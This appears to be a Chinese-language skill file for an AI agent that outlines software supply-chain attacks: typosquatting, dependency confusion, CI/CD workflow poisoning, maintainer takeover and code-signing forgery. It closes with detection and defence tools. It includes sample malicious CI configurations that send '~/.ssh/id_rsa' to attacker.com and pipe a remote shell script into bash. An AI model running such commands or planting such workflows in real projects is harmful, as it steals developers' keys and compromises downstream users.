---
name: supply-chain
description: Use when encountering 软件供应链安全攻击 - 拼写抢注、依赖混淆、ci/cd投毒、恶意依赖
---

# 供应链攻击

## Info

- **Domain**: web
- **Tags**: web, supply-chain, dependency, ci-cd

## 攻击思路
```
识别依赖管理方式 → 投毒恶意包/依赖 → 自动安装执行 → 凭据窃取/后门植入
```

## 供应链攻击矩阵

| 攻击类型 | 方式 | 目标 |
|----------|------|------|
| 拼写抢注(Typosquatting) | 发布相似名称包 | 开发者误装 |
| 依赖混淆(Dependency Confusion) | 发布同名公开包 | 私有包被替换 |
| CI/CD投毒 | 植入恶意workflow | 自动构建执行 |
| 维护者账户劫持 | 接管合法包维护者 | 原有包植入恶意代码 |
| 恶意PR提交 | 提交恶意代码PR | 被合并后植入 |

## 拼写抢注攻击

| 包管理器 | 抢注方式 | 示例 |
|----------|----------|------|
| npm | 相似拼写 | express → exprees |
| pip | 相似拼写 | requests → request |
| PyPI | 相似拼写 | django → djange |
| Maven | 相似名称 | commons-io → commons-io-ext |

```
# 正常安装
npm install express

# 抢注包
npm install exprees  # 开发者拼写错误 → 安装恶意包
```

## 依赖混淆攻击

```
私有包: @company/internal-api
攻击: 在npm公开发布同名包 @company/internal-api
结果: npm优先公开源 → 安装恶意公开包而非私有包
```

### 触发条件
```
1. 私有包未配置npm私有源优先
2. package.json使用包名而非URL
3. 构建系统未严格验证来源
```

## CI/CD投毒攻击

| 平台 | 投毒方式 | Payload位置 |
|------|----------|-------------|
| GitHub | workflow注入 | .github/workflows/*.yml |
| GitLab | CI配置注入 | .gitlab-ci.yml |
| Jenkins | Pipeline注入 | Jenkinsfile |
| CircleCI | Config注入 | .circleci/config.yml |

```yaml
# GitHub Actions恶意workflow
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Malicious Step
        run: curl http://attacker.com/steal?data=$(cat ~/.ssh/id_rsa)
```

```yaml
# GitLab CI恶意配置
script:
  - curl http://attacker.com/shell.sh | bash
  - export AWS_SECRET_KEY=...
```

## 恶意依赖特征

| 特征 | 检测方法 |
|------|----------|
| 异常网络请求 | 监控安装过程网络流量 |
| 文件系统异常访问 | 监控文件读写操作 |
| 环境变量读取 | 检查进程访问ENV行为 |
| 后台进程启动 | 检查子进程创建 |
| 远程代码下载 | 检查curl/wget调用 |

## 常见恶意行为

```
1. 窃取环境变量凭据
2. 上传SSH密钥/API密钥
3. 植入后门/RCE代码
4. 下载执行二级恶意软件
5. 修改构建产物
```

## 代码签名伪造

```
1. 获取过期/泄露的签名证书
2. 使用伪造证书签名恶意代码
3. 用户信任签名安装恶意包
```

## 社区攻击方式

| 方式 | 描述 |
|------|------|
| 社会工程学 | 伪装合法维护者提交恶意PR |
| 维护者接手 | 申请接手无人维护的合法包 |
| 版本投毒 | 在新版本中植入恶意代码 |
| 补丁投毒 | 伪装安全补丁提交恶意代码 |

## 检测与防护

| 检测方法 | 工具 |
|----------|------|
| 包审计 | npm audit, pip-audit |
| 依赖锁定 | lockfiles(Package-lock.json/requirements.txt) |
| 来源验证 | 验证包来源和签名 |
| CI监控 | 审计CI/CD配置文件 |